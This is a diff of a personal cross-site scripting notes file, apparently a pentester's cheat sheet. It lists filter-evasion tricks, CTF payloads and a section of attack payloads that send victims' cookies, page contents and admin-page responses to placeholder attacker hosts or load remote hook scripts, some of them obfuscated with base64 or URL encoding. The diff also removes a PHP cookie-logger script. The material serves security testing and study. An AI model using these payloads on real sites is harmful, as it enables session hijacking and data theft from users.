@@ -2,14 +2,15 @@
 
 https://github.com/UltimateHackers/AwesomeXSS
 
-# to checkout
-http://www.xss-payloads.com/
-https://github.com/mandatoryprogrammer/xsshunter
-https://github.com/Netflix/sleepy-puppy
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+http://www.xss-payloads.com/ # keylogger, screenshot ...
 
 https://github.com/jackmasa/XSS.png # mind map
 https://html5sec.org/ https://github.com/cure53/H5SC https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml
-https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29
+
+# blind
+https://github.com/mandatoryprogrammer/xsshunter
+https://github.com/Netflix/sleepy-puppy
 
 # test your payloads with
 http://jsfiddle.net/njx5B/3/
@@ -19,7 +20,7 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 ~/Documents/papers/favorite_xss_filter_and_bypass.pdf,xss_bypass.txt
 https://soroush.secproject.com/blog/2014/04/how-did-i-bypass-everything-in-modsecurity-evasion-challenge/
 http://sirdarckcat.blogspot.com.au/
-https://www.youtube.com/watch?v=tDjw0cmKS48 "Unusual Web Bugs" by kuza55
+https://www.youtube.com/watch?v=e4dFCyYnCcM "Unusual Web Bugs" by kuza55
 https://github.com/aemkei/katakana.js # Write JavaScript alert(1) with Katakana characters only
 
 # safari URL redirection XSS - CVE-2016-4585
@@ -37,7 +38,7 @@ http://web.archive.org/web/20130808104241/http:/appsec.ws/FlashExploitDatabase.p
 <body/onload=
 " style="tr:expression(malicious_script)
 
-document['location']='http://3652113177/'+document['cookie'] # sans les caracteres '.' et ' '
+document['location']='http://3652113177/'+document['cookie']
 onfocus="alert(0)" autofocus="autofocus" asdf="
 <style>body  > *{display:none;}body:after{font-size:xx-large;content:"this is not how you send people to mars"}</style>
 
@@ -46,7 +47,7 @@ div><img/src=a onerror=alert(0)>
 <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==" alt="Red dot" />
 
 Location: data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg== # based64(<script>alert(0)</script>)
-<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==">  # ff
+<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==">  # ff
 "><x style="x:expression(alert(0)) # ie
 
 <ScRiPt>
@@ -61,15 +62,14 @@ java%0ascript
 prompt(1), confirm(...)
 oninput= onplay= // html5
 <form, oninput=prompt(1)> works too
-charset http://ha.ckers.org/charsets.html
+html-encode : -> &#58; url-encode-> %26%2358%3B
+charsets...
 
 <script src="https://../export.jsp;.html?name=%0D%0AContent-Type:%20text/html%0d%0aLast-Modified:%20Tue,%2015%20Nov%201994%2012:45:26 GMT%0d%0aExpires:%20Tue,%2015%20Nov%202015%2012:45:26%20GMT%0d%0a%0d%0a<script>alert(1)</script>" ></script>
 <iframe src="https://../export.jsp;.html?name=%0D%0AContent-Type:%20text/html%0d%0aLast-Modified:%20Tue,%2015%20Nov%201994%2012:45:26 GMT%0d%0aExpires:%20Tue,%2015%20Nov%202015%2012:45:26%20GMT%0d%0a%0d%0a<script>alert(1)</script>" ></iframe>
 
 exec js in ff when Content-Type: xml
 <a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/>
-
-html-encode : -> &#58; url-encode-> %26%2358%3B
 
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
@@ -80,7 +80,7 @@ or
 or
 <svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" /></a></svg>
 
-<LINK REL="stylesheet" HREF="https://192.168.122.1:8443/xss.css"> # ie6 OK
+<link rel="stylesheet" href="https://192.168.122.1:8443/xss.css"> # ie6 OK
 xss.css:
 body {
   background-image: url('javascript:alert("XSS");')
@@ -91,42 +91,38 @@ body {
 var a="alert(doc"+"ument..."; eval(a)
 eval(location.hash.substr(1))
 
+# moar tricks
 * http://www.slideshare.net/codeblue_jp/cb14-masato-kinugawaen
-if you can set encoding in URL (see http://l0.cm/encodings/table/)
+if can set encoding in URL (see http://l0.cm/encodings/table/)
 location.href => http://evil%2f@www.youtube.com/
 feed://evil.cm%2f/x.rss%3f@vulnsite.com/
 
-# IE
 * michele orru
-font-family:a/**/ression(alert(1))('\')exp\')
-Works on IE <= 9: <html> <head> </head> <body> <div style="font-family:a/**/ression(alert(666))('\')exp\')">pwn</div> </body> </html>
-Nice for attribute injection, split the first three chars of expression for filter evasion too (there is still the JS function but you can put obfuscated code instead :-)
-Thanks to chinese friends: http://wooyun.org/bugs/wooyun-2014-068564
-By @gainover1
+<html><head></head><body><div style="font-family:a/**/ression(alert(666))('\')exp\')">pwn</div></body></html> # ie <= 9
 
 * carlos
-<%foo onmouseover=alert(1)>blah (IE9 allows to define custom tags)
+<%foo onmouseover=alert(1)>blah # ie9 allows to define custom tags
 
-# httponly bypass
+* httponly bypass
 asp.net: the csrf protection is to actually include the session ID is in the ViewState (owasp)
 
 # attack payloads
 <script>document.location="http://evil/?c="+document.cookie</script>
 <script>var x=new XMLHttpRequest();x.open("POST","http://evil/",true);x.setRequestHeader("Content-type","application/x-www-form-urlencoded");x.send("x="+btoa(unescape(encodeURIComponent(document.body.innerHTML))));</script>
-<iframe frameborder=0 height=0 width=0 src=javascript:void(document.location="http://x/?c="+document.cookie)></iframe>
+<iframe frameborder=0 height=0 width=0 src=javascript:void(document.location="http://evil/?c="+document.cookie)></iframe>
 <script src=//evil/a.js></script>
-<script>window.location='http://evil/'+document.documentElement.innerHTML</script>
+<script>window.location='http://evil/?'+btoa(document.documentElement.innerHTML)</script>
 <iframe onload='var sc=document.createElement("scr"%2b"ipt");sc.type="text/javascr"%2b"ipt";sc.src="http://x.x.x.x:3000/hook.js";document.body.appendChild(sc);'/>
 <iframe src=//evil /> and index.html: <script src="http://x.x.x.x:3000/hook.js" type="text/javascript"></script>
-?q=%3Clink%0Crel%3Dimport%0Chref%3D%2F%2F1.2.3.4%3E # google-ctf-2016 final destination
-<a href="javascript:location='http://x/'%2bdocument.cookie" onclick="">x</a> # google-ctf-2016 geokitties trick where waf triggered when there was any non-empty event handler
+?q=%3Clink%0Crel%3Dimport%0Chref%3D%2F%2Fevil%3E # google-ctf-2016 final destination
+<a href="javascript:location='http://evil/'%2bdocument.cookie" onclick="">x</a> # google-ctf-2016 geokitties trick where waf triggered when there was any non-empty event handler
 \x3cimg src=a onerror=\u0022eval(String.fromCharCode(..))\u0022\x3e # 0ctf-2016 guestbook
 <img src=%23 onerror="document.location='http://evil/?c='%2bdocument.cookie">
 <img src=/ onerror=location='http://evil/?c='%2bdocument.cookie>
 new Image().src="http://evil/xss/?"+escape(document.cookie);
 
 <input type="text" onfocus="write(atob('PHNjcmlwdD4KZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwOi8vcmVxdWVzdGIuaW4vMW1sdjYxajE/Y29va2llPSIgKyBkb2N1bWVudC5jb29raWUgKyAiJyAvPiIpOwo8L3NjcmlwdD4='));" autofocus />
-<iframe srcdoc="%26lt%3Bimg%20src%26equals%3Bx%3Ax%20onerror%26equals%3Beval%26lpar%3Batob%26lpar%3B%27ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vd3d3LnBvdGF0b3BsYS5uZXQveHNzP2Nvb2tpZT0iK2VuY29kZVVSSShkb2N1bWVudC5jb29raWUpOw%3D%3D%27%26rpar%3B%26rpar%3B%26gt%3B (iframe with no closing >)
+<iframe srcdoc="%26lt%3Bimg%20src%26equals%3Bx%3Ax%20onerror%26equals%3Beval%26lpar%3Batob%26lpar%3B%27ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vd3d3LnBvdGF0b3BsYS5uZXQveHNzP2Nvb2tpZT0iK2VuY29kZVVSSShkb2N1bWVudC5jb29raWUpOw%3D%3D%27%26rpar%3B%26rpar%3B%26gt%3B # iframe with no closing >
 
 <script>x=new XMLHttpRequest();x.open("GET","/admin/",false);x.send();r=x.responseText;x.open("POST","http://evil/",true);x.setRequestHeader("Content-type","application/x-www-form-urlencoded");x.send(r);</script>
 <img src=x style=display:none onerror=eval(unescape(/xmlhttp%3Dnew%20XMLHttpRequest%28%29%3Bxmlhttp.open%28%22GET%22%2C%22%2fadmin%2fshow.php%22%2Cfalse%29%3Bxmlhttp.send%28%29%3Br%3Dxmlhttp.responseText%3Bxmlhttp.open%28%22POST%22%2C%22http%3A%2f%2frequestb.in%2f17b3o8z1%22%2Ctrue%29%3Bxmlhttp.setRequestHeader%28%22Content-type%22%2C%22application%2fx-www-form-urlencoded%22%29%3Bxmlhttp.send%28r%29%3B/.source));//
@@ -137,9 +133,9 @@ new Image().src="http://evil/xss/?"+escape(document.cookie);
   $.post('http://evil/analytics', x);
 </script>
 
-document.body.appendChild(document.createElement("script")).src="http://6.6.6.6:3000/hook.js"
+document.body.appendChild(document.createElement("script")).src="http://x.x.x.x:3000/hook.js"
 
-<script>setTimeout(x,3000);function/**/x(){parent.document.getElementsByTagName{"frame")[4].setAttribute("src","//localhost/index.html");}</script> (injecting in the context of a child frame, so we go back to parent to modify an existing frame)
+<script>setTimeout(x,3000);function/**/x(){parent.document.getElementsByTagName{"frame")[4].setAttribute("src","//localhost/index.html");}</script> # injecting in the context of a child frame, so we go back to parent to modify an existing frame
 
 <script>var c=new XMLHttpRequest();c.open('GET','/');c.setRequestHeader('Range','bytes=18-18446744073709551615');c.send();</script>
 
@@ -149,7 +145,7 @@ see "Unusual Web Bugs"
 http://www.awgh.org/archives/57 (CVE-2009-1140 / MS09-019)
 upload: <html><head><title>XSS Test Page</title><script>alert(document.cookie);</script></head><body><code>alert(document.cookie);</code></body></html>
 
-* unclear how it works:
+* works on ie6 & ie7
 http://sirdarckcat.blogspot.com.au/2007/12/bypassing-content-disposition.html
 
 # IE content sniffing / MIME-type confusion
@@ -157,20 +153,7 @@ http://blog.detectify.com/post/53925159976/how-to-avoid-ie-content-sniffing-xss-
 upload test.qwefhj: <html><body><script>alert(document.cookie)</script></body></html>
 fix: "X-Content-Type-Options: nosniff" header (http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx) only supported since IE9
 http://msdn.microsoft.com/en-us/library/ms775147.aspx
-
 works in old IE or if compatibility view is turned on
-
-# cookie logger
-<?php
-$data = "=== REQUEST FROM [".$_SERVER['REMOTE_ADDR']."] ";
-$data .= "-> ".date("Y-m-d : H:i:s")."\n";
-$data .= "GET:\n".var_export($_GET, true)."\n";
-$data .= "POST:\n".var_export($_POST, true)."\n";
-$data .= "COOKIE:\n".var_export($_COOKIE, true)."\n";
-$data .= "SERVER:\n".var_export($_SERVER, true)."\n\n";
-
-file_put_contents("log.txt", $data, FILE_APPEND);
-?>
 
 # IIS filter bypass
 https://blog.whitehatsec.com/internet-explorer-xss-filter/
@@ -181,7 +164,7 @@ http://www.jardinesoftware.net/2012/08/29/another-request-validation-bypass/ (sa
 http://www.thespanner.co.uk/2015/02/19/another-xss-auditor-bypass/
 
 # CSP tricks
-https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22
+https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22
 http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html
 https://conference.hitb.org/hitbsecconf2016ams/materials/D1T2%20-%20Michele%20Spagnuolo%20and%20Lukas%20Weichselbaum%20-%20CSP%20Oddities.pdf
 
